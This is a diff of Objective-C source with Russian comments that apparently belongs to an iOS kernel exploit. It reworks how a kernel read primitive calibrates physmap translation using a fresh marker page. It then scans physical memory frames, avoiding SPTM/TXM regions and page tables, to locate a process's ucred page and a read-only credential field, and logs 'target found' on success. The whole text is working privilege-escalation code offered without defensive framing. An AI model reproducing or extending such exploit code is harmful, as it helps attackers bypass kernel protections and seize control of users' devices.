@@ -8184,21 +8184,32 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] скип PA-спаны: SPTM %#llx..%#llx TXM %#llx..%#llx",
                               (unsigned long long)sptmPA, (unsigned long long)(sptmPA + 0xF4000),
                               (unsigned long long)txmPA, (unsigned long long)(txmPA + 0x64000)]);
-                    // 1.9.281: калибровка physmap-меппинга маркером ctlPA (0xCAFEBABE).
-                    // Какой путь реально читает DRAM на этом буте — linear (pa-pB+vB)
-                    // или PAPT (phystokv). Неверный ptov = молчаливый промах скана.
+                    // 1.9.282: калибровка на СВЕЖЕЙ странице — ctlPA к этому моменту
+                    // затёрт DMA-форжем (CONFIRMED пишет в неё), маркер стэйл (в 281
+                    // "ОБА МИМО" читали scaler-вывод 0x41414141/0x92400d6c). Плюс факт
+                    // железа: linear ≠ PAPT (прочли разное) — PAPT единственно верный.
                     BOOL useLinear = NO, mapOK = NO;
-                    if (ctlPA) {
-                        uint32_t mLin = (uint32_t)early_kread64(ctlPA - pB + vB);
-                        uint64_t papV = phystokv(ctlPA);
-                        uint32_t mPap = papV ? (uint32_t)early_kread64(papV) : 0;
-                        useLinear = (mLin == 0xCAFEBABE);
-                        mapOK = useLinear || (mPap == 0xCAFEBABE);
-                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] калибровка physmap: linear=%#010x papt=%#010x → %@",
-                                  mLin, mPap, useLinear ? @"LINEAR ✓" : (mPap == 0xCAFEBABE ? @"PAPT ✓" : @"ОБА МИМО — скан пропущен")]);
+                    {
+                        uint8_t *calPg = valloc(0x4000);
+                        *(uint64_t *)calPg = 0xCAFEBABE00C0FFEEULL;
+                        mlock(calPg, 0x4000);
+                        uint64_t calPA = vtophys(ttM, (uint64_t)calPg);
+                        if (calPA) {
+                            uint64_t linV = calPA - pB + vB;
+                            uint64_t papV = phystokv(calPA);
+                            uint64_t mLin = early_kread64(linV);
+                            uint64_t mPap = papV ? early_kread64(papV) : 0;
+                            useLinear = (mLin == 0xCAFEBABE00C0FFEEULL);
+                            mapOK = useLinear || (mPap == 0xCAFEBABE00C0FFEEULL);
+                            kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] калибровка physmap (fresh pa=%#llx): linear=%@ papt=%@ → %@",
+                                      (unsigned long long)calPA,
+                                      useLinear ? @"✓" : @"✗", mPap == 0xCAFEBABE00C0FFEEULL ? @"✓" : @"✗",
+                                      useLinear ? @"LINEAR" : (mPap == 0xCAFEBABE00C0FFEEULL ? @"PAPT" : @"ОБА МИМО — скан пропущен")]);
+                        }
+                        munlock(calPg, 0x4000); free(calPg);
                     }
                     if (uoff2 + 0x100 <= 0x4000 && mapOK) {
-                        uint64_t reads = 0;
+                        uint64_t reads = 0, gaps = 0;
                         uint64_t idx = 0;
                         for (; idx < nF && (!pagePA || !roFieldPA); idx++) {
                             uint64_t pa = pB + (idx << 14);
@@ -8210,7 +8221,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             int t = kpFrameTypeOf(pa);
                             if (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18) continue;   // таблицы — deadly
                             uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
-                            if (!pkva2) continue;
+                            if (!pkva2) { gaps++; continue; }
                             reads++;
                             // (a) страница ucred: label + uid на тех же смещениях
                             if (!pagePA && early_kread64(pkva2 + uoff2 + 0x78) == labelQ &&
@@ -8233,8 +8244,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                           (unsigned long long)roFieldPA]);
                             }
                         }
-                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] финиш: кадров=%#llx чтений=%llu ucredPA=%#llx roFieldPA=%#llx — %@",
-                                  (unsigned long long)idx, (unsigned long long)reads,
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] финиш: кадров=%#llx чтений=%llu дыр-PAPT=%llu ucredPA=%#llx roFieldPA=%#llx — %@",
+                                  (unsigned long long)idx, (unsigned long long)reads, (unsigned long long)gaps,
                                   (unsigned long long)pagePA, (unsigned long long)roFieldPA,
                                   (pagePA || roFieldPA) ? @"ЦЕЛЬ НАЙДЕНА ★" : @"мимо — по census-типам доберём"]);
                     }
